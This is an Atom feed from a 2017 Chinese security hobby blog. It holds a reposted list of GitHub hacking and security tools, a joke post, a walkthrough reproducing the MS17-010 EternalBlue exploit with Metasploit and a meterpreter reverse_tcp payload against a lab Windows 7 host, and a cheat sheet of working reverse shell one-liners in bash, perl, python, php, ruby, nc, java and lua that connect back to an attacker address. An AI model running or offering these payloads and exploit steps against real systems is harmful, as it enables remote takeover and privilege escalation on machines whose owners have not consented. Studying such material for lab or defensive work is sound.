<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yingzhzh&#39;s Notes</title>
  <subtitle>网络安全爱好者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yingzhzh.github.io/"/>
  <updated>2017-08-03T03:10:17.304Z</updated>
  <id>http://yingzhzh.github.io/</id>
  
  <author>
    <name>Yingzhzh</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Github 安全类Repo收集整理</title>
    <link href="http://yingzhzh.github.io/2017/08/03/git-sec-repo-hub/"/>
    <id>http://yingzhzh.github.io/2017/08/03/git-sec-repo-hub/</id>
    <published>2017-08-03T02:45:36.000Z</published>
    <updated>2017-08-03T03:10:17.304Z</updated>
    
    <content type="html"><![CDATA[<p>原文地址：<a href="https://zhuanlan.zhihu.com/p/21380662" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21380662</a> 转：<a href="http://zone.wooyun.org/content/28363" target="_blank" rel="external">http://zone.wooyun.org/content/28363</a><br>作者：天谕 链接：<a href="https://zhuanlan.zhihu.com/p/21380662" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21380662</a> 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。<br>漏洞及渗透练习平台：<br>WebGoat漏洞练习环境</p>
<p><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="external">https://github.com/WebGoat/WebGoat</a><br><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="external">https://github.com/WebGoat/WebGoat-Legacy</a><br>Damn Vulnerable Web Application(漏洞练习平台)<br><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="external">https://github.com/RandomStorm/DVWA</a><br>数据库注入练习平台<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>用node编写的漏洞练习平台，like OWASP Node Goat<br><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="external">https://github.com/cr0hn/vulnerable-node</a><br>花式扫描器 ：</p>
<p>端口扫描器Nmap<br><a href="https://github.com/nmap/nmap" target="_blank" rel="external">https://github.com/nmap/nmap</a><br>本地网络扫描器<br><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="external">https://github.com/SkyLined/LocalNetworkScanner</a><br>子域名扫描器<br><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="external">https://github.com/lijiejie/subDomainsBrute</a><br>漏洞路由扫描器<br><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="external">https://github.com/jh00nbr/Routerhunter-2.0</a><br>迷你批量信息泄漏扫描脚本<br><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="external">https://github.com/lijiejie/BBScan</a><br>Waf类型检测工具<br><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="external">https://github.com/EnableSecurity/wafw00f</a><br>信息搜集工具 :</p>
<p>社工插件，可查找以email、phone、username的注册的所有网站账号信息<br><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="external">https://github.com/n0tr00t/Sreg</a><br>Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息<br><a href="https://github.com/sea-god/gitscan" target="_blank" rel="external">https://github.com/sea-god/gitscan</a><br>github Repo信息搜集工具<br><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="external">https://github.com/metac0rtex/GitHarvester</a><br>WEB：</p>
<p>webshell大合集<br><a href="https://github.com/tennc/webshell" target="_blank" rel="external">https://github.com/tennc/webshell</a><br>渗透以及web攻击脚本<br><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="external">https://github.com/brianwrf/hackUtils</a><br>web渗透小工具大合集<br><a href="https://github.com/rootphantomer/hack_tools_for_me" target="_blank" rel="external">https://github.com/rootphantomer/hack_tools_for_me</a><br>XSS数据接收平台<br><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="external">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
<p>XSS与CSRF工具<br><a href="https://github.com/evilcos/xssor" target="_blank" rel="external">https://github.com/evilcos/xssor</a><br>Short for command injection exploiter，web向命令注入检测工具<br><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="external">https://github.com/stasinopoulos/commix</a><br>数据库注入工具<br><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="external">https://github.com/sqlmapproject/sqlmap</a><br>Web代理，通过加载sqlmap api进行sqli实时检测<br><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="external">https://github.com/zt2/sqli-hunter</a><br>新版中国菜刀<br><a href="https://github.com/Chora10/Cknife" target="_blank" rel="external">https://github.com/Chora10/Cknife</a><br>.git泄露利用EXP<br><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">https://github.com/lijiejie/GitHack</a><br>浏览器攻击框架<br><a href="https://github.com/beefproject/beef" target="_blank" rel="external">https://github.com/beefproject/beef</a><br>自动化绕过WAF脚本<br><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="external">https://github.com/khalilbijjou/WAFNinja</a><br>http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）<br><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="external">https://github.com/jkbrzt/httpie</a><br>浏览器调试利器<br><a href="https://github.com/firebug/firebug" target="_blank" rel="external">https://github.com/firebug/firebug</a><br>一款开源WAF<br><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="external">https://github.com/SpiderLabs/ModSecurity</a><br>windows域渗透工具：</p>
<p>windows渗透神器<br><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz</a><br>Powershell渗透库合集<br><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="external">https://github.com/PowerShellMafia/PowerSploit</a><br>Powershell tools合集</p>
<p><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="external">https://github.com/clymb3r/PowerShell</a><br>Fuzz:</p>
<p>Web向Fuzz工具<br><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="external">https://github.com/xmendez/wfuzz</a><br>HTTP暴力破解，撞库攻击脚本<br><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="external">https://github.com/lijiejie/htpwdScan</a></p>
<p>漏洞利用及攻击框架：</p>
<p>msf<br><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework</a><br>Poc调用框架，可加载Pocsuite,Tangscan，Beebeeto等<br><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="external">https://github.com/erevus-cn/pocscan</a><br>Pocsuite<br><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="external">https://github.com/knownsec/Pocsuite</a><br>Beebeeto<br><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="external">https://github.com/n0tr00t/Beebeeto-framework</a><br>漏洞POC&amp;EXP:</p>
<p>ExploitDB官方git版本<br><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="external">https://github.com/offensive-security/exploit-database</a><br>php漏洞代码分析<br><a href="https://github.com/80vul/phpcodz" target="_blank" rel="external">https://github.com/80vul/phpcodz</a><br>Simple test for CVE-2016-2107<br><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="external">https://github.com/FiloSottile/CVE-2016-2107</a><br>CVE-2015-7547 POC<br><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="external">https://github.com/fjserna/CVE-2015-7547</a><br>JAVA反序列化POC生成工具<br><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">https://github.com/frohoff/ysoserial</a><br>JAVA反序列化EXP<br><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="external">https://github.com/foxglovesec/JavaUnserializeExploits</a><br>Jenkins CommonCollections EXP<br><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="external">https://github.com/CaledoniaProject/jenkins-cli-exploit</a><br>CVE-2015-2426 EXP (windows内核提权)<br><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="external">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a><br>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示)<br><a href="https://github.com/hxer/vulnapp" target="_blank" rel="external">https://github.com/hxer/vulnapp</a><br>php7缓存覆写漏洞Demo及相关工具<br><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="external">https://github.com/GoSecure/php7-opcache-override</a><br>XcodeGhost木马样本<br><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="external">https://github.com/XcodeGhostSource/XcodeGhost</a><br>中间人攻击及钓鱼</p>
<p>中间人攻击框架<br><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="external">https://github.com/secretsquirrel/the-backdoor-factory</a><br><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="external">https://github.com/secretsquirrel/BDFProxy</a><br><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="external">https://github.com/byt3bl33d3r/MITMf</a><br>Inject code, jam wifi, and spy on wifi users<br><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="external">https://github.com/DanMcInerney/LANs.py</a><br>可扩展的中间人代理工具<br><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="external">https://github.com/intrepidusgroup/mallory</a><br>wifi钓鱼<br><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="external">https://github.com/sophron/wifiphisher</a><br>密码破解：</p>
<p>密码破解工具<br><a href="https://github.com/shinnok/johnny" target="_blank" rel="external">https://github.com/shinnok/johnny</a><br>本地存储的各类密码提取利器</p>
<p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="external">https://github.com/AlessandroZ/LaZagne</a><br>二进制及代码分析工具：</p>
<p>二进制分析工具<br><a href="https://github.com/devttys0/binwalk" target="_blank" rel="external">https://github.com/devttys0/binwalk</a><br>系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息<br><a href="https://github.com/quarkslab/binmap" target="_blank" rel="external">https://github.com/quarkslab/binmap</a><br>rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O (doesn’t support the FAT binaries) x86/x64 binaries.<br><a href="https://github.com/0vercl0k/rp" target="_blank" rel="external">https://github.com/0vercl0k/rp</a><br>Windows Exploit Development工具<br><a href="https://github.com/lillypad/badger" target="_blank" rel="external">https://github.com/lillypad/badger</a><br>二进制静态分析工具（python）<br><a href="https://github.com/bdcht/amoco" target="_blank" rel="external">https://github.com/bdcht/amoco</a><br>Python Exploit Development Assistance for GDB<br><a href="https://github.com/longld/peda" target="_blank" rel="external">https://github.com/longld/peda</a><br>对BillGates Linux Botnet系木马活动的监控工具<br><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="external">https://github.com/ValdikSS/billgates-botnet-tracker</a><br>木马配置参数提取工具</p>
<p><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="external">https://github.com/kevthehermit/RATDecoders</a><br>Shellphish编写的二进制分析工具（CTF向）<br><a href="https://github.com/angr/angr" target="_blank" rel="external">https://github.com/angr/angr</a><br>针对python的静态代码分析工具</p>
<p><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="external">https://github.com/yinwang0/pysonar2</a><br>一个自动化的脚本（shell）分析工具，用来给出警告和建议<br><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="external">https://github.com/koalaman/shellcheck</a><br>基于AST变换的简易Javascript反混淆辅助工具<br><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="external">https://github.com/ChiChou/etacsufbo</a><br>EXP编写框架及工具：</p>
<p>二进制EXP编写工具<br><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="external">https://github.com/t00sh/rop-tool</a><br>CTF Pwn 类题目脚本编写框架<br><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="external">https://github.com/Gallopsled/pwntools</a><br>an easy-to-use io library for pwning development<br><a href="https://github.com/zTrix/zio" target="_blank" rel="external">https://github.com/zTrix/zio</a><br>跨平台注入工具（ Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.）<br><a href="https://github.com/frida/frida" target="_blank" rel="external">https://github.com/frida/frida</a><br>隐写：</p>
<p>隐写检测工具<br><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="external">https://github.com/abeluck/stegdetect</a><br>各类安全资料:</p>
<p>域渗透教程<br><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="external">https://github.com/l3m0n/pentest_study</a><br>python security教程（原文链接<a href="http://www.primalsecurity.net/tutorials/python-tutorials/）" target="_blank" rel="external">http://www.primalsecurity.net/tutorials/python-tutorials/）</a><br><a href="https://github.com/smartFlash/pySecurity" target="_blank" rel="external">https://github.com/smartFlash/pySecurity</a><br>data_hacking合集<br><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="external">https://github.com/ClickSecurity/data_hacking</a><br>mobile-security-wiki<br><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="external">https://github.com/exploitprotocol/mobile-security-wiki</a><br>书籍《reverse-engineering-for-beginners》<br><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="external">https://github.com/veficos/reverse-engineering-for-beginners</a><br>一些信息安全标准及设备配置<br><a href="https://github.com/luyg24/IT_security" target="_blank" rel="external">https://github.com/luyg24/IT_security</a><br>APT相关笔记<br><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="external">https://github.com/kbandla/APTnotes</a><br>Kcon资料<br><a href="https://github.com/knownsec/KCon" target="_blank" rel="external">https://github.com/knownsec/KCon</a><br>ctf及黑客资源合集<br><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="external">https://github.com/bt3gl/My-Gray-Hacker-Resources</a><br>ctf和安全工具大合集<br><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="external">https://github.com/zardus/ctf-tools</a><br>《DO NOT FUCK WITH A HACKER》<br><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="external">https://github.com/citypw/DNFWAH</a><br>各类CTF资源</p>
<p>近年ctf writeup大全<br><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="external">https://github.com/ctfs/write-ups-2016</a><br><a href="https://github.com/ctfs/write-ups-2015" target="_blank" rel="external">https://github.com/ctfs/write-ups-2015</a><br><a href="https://github.com/ctfs/write-ups-2014" target="_blank" rel="external">https://github.com/ctfs/write-ups-2014</a><br>fbctf竞赛平台Demo<br><a href="https://github.com/facebook/fbctf" target="_blank" rel="external">https://github.com/facebook/fbctf</a><br>ctf Resources<br><a href="https://github.com/ctfs/resources" target="_blank" rel="external">https://github.com/ctfs/resources</a><br>各类编程资源:</p>
<p>大礼包（什么都有）<br><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="external">https://github.com/bayandin/awesome-awesomeness</a> bash-handbook<br><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="external">https://github.com/denysdovhan/bash-handbook</a> python资源大全<br><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="external">https://github.com/jobbole/awesome-python-cn</a> git学习资料<br><a href="https://github.com/xirong/my-git" target="_blank" rel="external">https://github.com/xirong/my-git</a> 安卓开源代码解析<br><a href="https://github.com/android-cn/android-open-project-analysis" target="_blank" rel="external">https://github.com/android-cn/android-open-project-analysis</a> python框架，库，资源大合集<br><a href="https://github.com/vinta/awesome-python" target="_blank" rel="external">https://github.com/vinta/awesome-python</a> JS 正则表达式库（用于简化构造复杂的JS正则表达式）<br><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="external">https://github.com/VerbalExpressions/JSVerbalExpressions</a><br>Python：</p>
<p>python 正则表达式库（用于简化构造复杂的python正则表达式） <a href="https://github.com/VerbalExpressions/PythonVerbalExpressions" target="_blank" rel="external">https://github.com/VerbalExpressions/PythonVerbalExpressions</a> python任务管理以及命令执行库<br><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="external">https://github.com/pyinvoke/invoke</a> python exe打包库<br><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="external">https://github.com/pyinstaller/pyinstaller</a> py3 爬虫框架<br><a href="https://github.com/orf/cyborg" target="_blank" rel="external">https://github.com/orf/cyborg</a> 一个提供底层接口数据包编程和网络协议支持的python库<br><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="external">https://github.com/CoreSecurity/impacket</a> python requests 库<br><a href="https://github.com/kennethreitz/requests" target="_blank" rel="external">https://github.com/kennethreitz/requests</a> python 实用工具合集<br><a href="https://github.com/mahmoud/boltons" target="_blank" rel="external">https://github.com/mahmoud/boltons</a> python爬虫系统<br><a href="https://github.com/binux/pyspider" target="_blank" rel="external">https://github.com/binux/pyspider</a> ctf向 python工具包<br><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="external">https://github.com/P1kachu/v0lt</a><br>科学上网：</p>
<p>科学上网工具 <a href="https://github.com/XX-net/XX-Net" target="_blank" rel="external">https://github.com/XX-net/XX-Net</a><br>福利：</p>
<p>微信自动抢红包动态库 <a href="https://github.com/east520/AutoGetRedEnv" target="_blank" rel="external">https://github.com/east520/AutoGetRedEnv</a><br>微信抢红包插件（安卓版） <a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney" target="_blank" rel="external">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a> 神器<br><a href="https://github.com/yangyangwithgnu/hardseed" target="_blank" rel="external">https://github.com/yangyangwithgnu/hardseed</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文地址：&lt;a href=&quot;https://zhuanlan.zhihu.com/p/21380662&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://zhuanlan.zhihu.com/p/21380662&lt;/a&gt; 转：&lt;a href=&quot;
    
    </summary>
    
      <category term="网络安全" scheme="http://yingzhzh.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="http://yingzhzh.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Linux 下多种反弹 shell 方法</title>
    <link href="http://yingzhzh.github.io/2017/08/02/linux-reverse-shell/"/>
    <id>http://yingzhzh.github.io/2017/08/02/linux-reverse-shell/</id>
    <published>2017-08-02T03:37:27.000Z</published>
    <updated>2017-08-02T03:44:26.285Z</updated>
    
    <content type="html"><![CDATA[<p>bash命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</div></pre></td></tr></table></figure></p>
<p>perl版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;</div></pre></td></tr></table></figure></p>
<p>python版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure></p>
<p>php版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</div></pre></td></tr></table></figure></p>
<p>ruby版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</div></pre></td></tr></table></figure></p>
<p>nc 版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh 10.0.0.1 1234</div><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</div><div class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</div></pre></td></tr></table></figure></p>
<p>java 版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure></p>
<p>lua版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;10.0.0.1&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;bash命令：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://yingzhzh.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="linux" scheme="http://yingzhzh.github.io/tags/linux/"/>
    
      <category term="shell" scheme="http://yingzhzh.github.io/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>2333333</title>
    <link href="http://yingzhzh.github.io/2017/08/01/2333333/"/>
    <id>http://yingzhzh.github.io/2017/08/01/2333333/</id>
    <published>2017-08-01T06:57:10.000Z</published>
    <updated>2017-08-02T03:26:50.897Z</updated>
    
    <content type="html"><![CDATA[<center><br>22332222223332222223322333322333222233322333322<br>22322222222322222222322333322332233223322333322<br>22332222222222222223322333322322333322322333322<br>22333322222222222233333222233322333322322333322<br>22333333222222223333333322333322333322322333322<br>22333333332222333333333322333332233223322333322<br>22333333333223333333333322333333222233332222223<br></center><br><center><br>1. chrome 打开<br>2. ctrl+F<br>3. 然后输入 2<br></center>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;br&gt;22332222223332222223322333322333222233322333322&lt;br&gt;22322222222322222222322333322332233223322333322&lt;br&gt;22332222222222222223322333
    
    </summary>
    
      <category term="生活娱乐" scheme="http://yingzhzh.github.io/categories/%E7%94%9F%E6%B4%BB%E5%A8%B1%E4%B9%90/"/>
    
    
      <category term="特殊的表白姿势" scheme="http://yingzhzh.github.io/tags/%E7%89%B9%E6%AE%8A%E7%9A%84%E8%A1%A8%E7%99%BD%E5%A7%BF%E5%8A%BF/"/>
    
      <category term="666" scheme="http://yingzhzh.github.io/tags/666/"/>
    
  </entry>
  
  <entry>
    <title>ms17010-exploit</title>
    <link href="http://yingzhzh.github.io/2017/08/01/ms17010-exploit/"/>
    <id>http://yingzhzh.github.io/2017/08/01/ms17010-exploit/</id>
    <published>2017-08-01T05:26:26.000Z</published>
    <updated>2017-08-02T03:10:26.146Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.hi-noob.com/20170427/ms17_010/" title="ms17-010 exp复现" target="_blank" rel="external">原文:http://www.hi-noob.com/20170427/ms17_010</a></p>
<p>前言</p>
<p>Shadow Brokers公布的文件需要win32位+python2.6+pywin32环境，利用起来有很多设置，略显麻烦，正好t00ls有相关的exp和利用过程，我就写了这篇文章记录我自己的一个复现过程。</p>
<a id="more"></a> 
<h1 id="0x00-创建wine"><a href="#0x00-创建wine" class="headerlink" title="0x00 创建wine"></a>0x00 创建wine</h1><p>kali 64位</p>
<p>kali 64位需要兼容32位环境才可以使用,执行以下命令来安装32位运行库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&apos;dpkg --add-architecture i386</div><div class="line">apt-get update</div><div class="line">apt-get install lib32z1 lib32ncurses5</div><div class="line">apt-get install wine32</div><div class="line">wine cmd.exe&apos;</div></pre></td></tr></table></figure></p>
<p>kali 32位<br>直接执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;wine cmd.exe&apos;</div></pre></td></tr></table></figure></p>
<p>即可<br><img src="http://op2ihgtv7.bkt.clouddn.com/2.png" alt=""></p>
<h1 id="0x01修改exp"><a href="#0x01修改exp" class="headerlink" title="0x01修改exp"></a>0x01修改exp</h1><p>下载exp:<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/" target="_blank" rel="external">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/</a><br>解压文件将其中的deps文件夹和eternalblue_doublepulsar.rb复制到/usr/share/metasploit-framework/modules/exploits/windows/smb/下,我在这里将eternalblue_doublepulsar.rb重命名为ms17_010_smb_RCE.rb,方便以后的查找利用。<br>修改rb文件<br>为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/1.png" alt=""></p>
<h1 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h1><p>攻击机：kali 192.168.1.108</p>
<p>靶 机：win7 64位 旗舰版 sp1(关闭防火墙)</p>
<p>MSF使用就很简单了，下面列出主要的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&apos;use exploit/windows/smb/ms17_010_smb_RCE</div><div class="line">set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.108</div><div class="line">set rhost 192.168.1.107</div><div class="line">set target 9</div><div class="line">set targetarchitecture x64</div><div class="line">exploit&apos;</div></pre></td></tr></table></figure></p>
<p>附效果图<br>为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/3.jpg" alt=""></p>
<h1 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h1><p>本人菜鸟，记录的都是很简单的一些东西，大牛绕过就可以了，谢谢，欢迎交流。md语法也是一边百度一边用，可能排版不好，请见谅。</p>
<p>参考链接：<a href="https://www.t00ls.net/thread-39584-1-1.html" target="_blank" rel="external">https://www.t00ls.net/thread-39584-1-1.html</a></p>
<h1 id="纠正"><a href="#纠正" class="headerlink" title="纠正"></a>纠正</h1><p>按照上面的攻击过程获取到的权限一般都是local service \ network service，无法进行提权。问题出现在PROCESSINJECT(注入进程)的设置上。上文中注入的进程是svchost.exe,我们查看进程可以发现svchost.exe有多个进程，分别有local service \ network service \ system三种权限。<br>为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/8.jpg" alt=""></p>
<p>这也就难怪获得的权限是local service \ network service。<br>我们只需将注入进程修改为system / admin权限的进程就OK，例如explorer.exe、lsass.exe等等。为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/5.png" alt=""></p>
<p>或者你可以每次利用时set PROCESSINJECT 进程名 设置即可。<br><img src="http://op2ihgtv7.bkt.clouddn.com/6.png" alt=""></p>
<p>下面是获取到system权限的效果图<br><img src="http://op2ihgtv7.bkt.clouddn.com/7.jpg" alt=""></p>
<h3 id="最后附一张成功图片"><a href="#最后附一张成功图片" class="headerlink" title="最后附一张成功图片"></a>最后附一张成功图片</h3><p>注：原文set target 9要根据实际msf show options来<br><img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fi46qz6kikj214y0mddh3.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.hi-noob.com/20170427/ms17_010/&quot; title=&quot;ms17-010 exp复现&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原文:http://www.hi-noob.com/20170427/ms17_010&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;前言&lt;/p&gt;
&lt;p&gt;Shadow Brokers公布的文件需要win32位+python2.6+pywin32环境，利用起来有很多设置，略显麻烦，正好t00ls有相关的exp和利用过程，我就写了这篇文章记录我自己的一个复现过程。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞利用" scheme="http://yingzhzh.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
